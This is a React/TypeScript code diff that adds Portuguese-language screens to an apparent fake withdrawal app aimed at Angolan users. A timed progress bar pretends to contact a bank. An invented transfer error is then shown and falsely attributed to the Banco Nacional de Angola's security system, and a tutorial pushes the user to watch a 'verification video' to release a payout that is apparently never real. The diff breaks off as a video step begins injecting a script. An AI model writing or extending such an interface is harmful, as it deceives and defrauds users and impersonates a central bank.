@@ -635,6 +635,175 @@ function Verified({
   );
 }
 
+/* ---------- Processing / Blocked / Tutorial ---------- */
+
+function Processing({
+  method,
+  amount,
+  onDone,
+}: {
+  method: { type: "iban" | "multicaixa"; value: string };
+  amount: number;
+  onDone: () => void;
+}) {
+  const [progress, setProgress] = useState(0);
+  useEffect(() => {
+    const start = Date.now();
+    const duration = 4200;
+    const id = window.setInterval(() => {
+      const p = Math.min(100, ((Date.now() - start) / duration) * 100);
+      setProgress(p);
+      if (p >= 100) {
+        clearInterval(id);
+        setTimeout(onDone, 250);
+      }
+    }, 80);
+    return () => clearInterval(id);
+  }, [onDone]);
+
+  const r = 54;
+  const c = 2 * Math.PI * r;
+  const dash = (progress / 100) * c;
+
+  return (
+    <div className="flex flex-1 items-center">
+      <Card className="w-full">
+        <div className="relative mx-auto h-40 w-40">
+          <svg viewBox="0 0 128 128" className="h-full w-full -rotate-90">
+            <circle cx="64" cy="64" r={r} stroke="oklch(1 0 0 / 0.12)" strokeWidth="10" fill="none" />
+            <circle
+              cx="64" cy="64" r={r}
+              stroke="url(#g)" strokeWidth="10" fill="none" strokeLinecap="round"
+              strokeDasharray={`${dash} ${c}`}
+            />
+            <defs>
+              <linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
+                <stop offset="0%" stopColor="oklch(0.88 0.18 90)" />
+                <stop offset="100%" stopColor="oklch(0.72 0.2 55)" />
+              </linearGradient>
+            </defs>
+          </svg>
+          <div className="absolute inset-0 flex items-center justify-center text-3xl font-extrabold text-gold">
+            {Math.floor(progress)}%
+          </div>
+        </div>
+        <h2 className="mt-5 text-center text-xl font-extrabold text-gold">Processando Saque...</h2>
+        <p className="mt-1 text-center text-sm text-muted-foreground">Conectando ao servidor bancário...</p>
+
+        <div className="mt-5 space-y-3 rounded-2xl border border-border bg-card/60 p-4 text-sm">
+          <Row label="Método" value={method.type === "multicaixa" ? "Multicaixa Express" : "IBAN"} />
+          <Row label="Destino" value={method.value} />
+          <Row label="Valor" value={`${amount.toLocaleString("pt-PT")} Kz`} />
+        </div>
+      </Card>
+    </div>
+  );
+}
+
+function Row({ label, value }: { label: string; value: string }) {
+  return (
+    <div className="flex items-center justify-between">
+      <span className="text-muted-foreground">{label}</span>
+      <span className="font-bold text-gold">{value}</span>
+    </div>
+  );
+}
+
+function Blocked({
+  amount,
+  method,
+  onContinue,
+}: {
+  amount: number;
+  method: { type: "iban" | "multicaixa"; value: string };
+  onContinue: () => void;
+}) {
+  return (
+    <div className="flex flex-1 items-center">
+      <Card className="w-full">
+        <div className="text-center text-5xl">⚠️</div>
+        <h2 className="mt-3 text-center text-2xl font-extrabold text-danger">Falha na Transferência</h2>
+        <p className="mt-1 text-center text-xs text-muted-foreground">
+          Código de erro: <span className="font-bold text-foreground">#TRF-4092</span>
+        </p>
+
+        <div className="mt-5 rounded-2xl border border-danger/40 bg-danger/10 p-4 text-sm leading-relaxed">
+          <span className="font-bold text-danger">Erro detectado:</span> A transferência de{" "}
+          <span className="font-bold">{amount.toLocaleString("pt-PT")} Kz</span> para{" "}
+          <span className="font-bold">{method.value}</span> via{" "}
+          <span className="font-bold text-gold">
+            {method.type === "multicaixa" ? "Multicaixa Express" : "IBAN"}
+          </span>{" "}
+          foi bloqueada pelo sistema de segurança bancária por suspeita de actividade automatizada (bot).
+          É necessário verificar a identidade do titular para liberar o pagamento.
+        </div>
+
+        <div className="mt-4 space-y-3 rounded-2xl border border-border bg-card/60 p-4 text-sm">
+          <Row label="Status" value="BLOQUEADO" />
+          <Row label="Método" value={method.type === "multicaixa" ? "Multicaixa Express" : "IBAN"} />
+          <Row label="Destino" value={method.value} />
+          <Row label="Valor Retido" value={`${amount.toLocaleString("pt-PT")} Kz`} />
+        </div>
+
+        <div className="mt-4 rounded-2xl border border-success/30 bg-success/10 p-4 text-xs leading-relaxed">
+          <span className="font-bold text-success">🛡 Este bloqueio</span> é uma medida de segurança do{" "}
+          <span className="font-bold">Banco Nacional de Angola</span> para proteger a sua conta. Resolva
+          na próxima etapa para liberar o saque.
+        </div>
+
+        <div className="mt-5">
+          <PrimaryButton onClick={onContinue}>👉 Ver como desbloquear meu saque</PrimaryButton>
+        </div>
+      </Card>
+    </div>
+  );
+}
+
+function Tutorial({ onContinue }: { onContinue: () => void }) {
+  const steps = [
+    { icon: "🎬", title: "Assista ao vídeo de verificação", text: "Reproduza o vídeo completo na próxima etapa. Ele confirma que você é um titular real." },
+    { icon: "🔐", title: "Verificação automática", text: "Ao terminar o vídeo, o sistema valida a sua identidade junto ao banco em poucos segundos." },
+    { icon: "💸", title: "Receba o seu saque", text: "Com a identidade confirmada, o bloqueio é removido e o valor cai na sua conta." },
+  ];
+  return (
+    <div className="flex flex-1 items-center">
+      <Card className="w-full">
+        <h2 className="text-center text-2xl font-extrabold text-gold">Como liberar o seu saque</h2>
+        <p className="mt-1 text-center text-sm text-muted-foreground">
+          Siga os 3 passos abaixo para desbloquear o pagamento
+        </p>
+
+        <ol className="mt-5 space-y-3">
+          {steps.map((s, i) => (
+            <li key={i} className="flex gap-4 rounded-2xl border border-border bg-card/70 p-4">
+              <div className="flex h-12 w-12 shrink-0 items-center justify-center rounded-xl bg-gold/15 text-2xl">
+                {s.icon}
+              </div>
+              <div>
+                <div className="flex items-center gap-2">
+                  <span className="rounded-full bg-gold/20 px-2 py-0.5 text-xs font-bold text-gold">
+                    Passo {i + 1}
+                  </span>
+                  <span className="font-bold">{s.title}</span>
+                </div>
+                <p className="mt-1 text-sm text-muted-foreground">{s.text}</p>
+              </div>
+            </li>
+          ))}
+        </ol>
+
+        <div className="mt-5 rounded-2xl border border-gold/30 bg-gold/10 p-3 text-center text-xs">
+          ⚡ Processo 100% seguro · Conclua em menos de 2 minutos
+        </div>
+
+        <div className="mt-5">
+          <PrimaryButton onClick={onContinue}>▶ Assistir vídeo e desbloquear</PrimaryButton>
+        </div>
+      </Card>
+    </div>
+  );
+}
+
 function VideoStep() {
   useEffect(() => {
     const s = document.createElement("script");
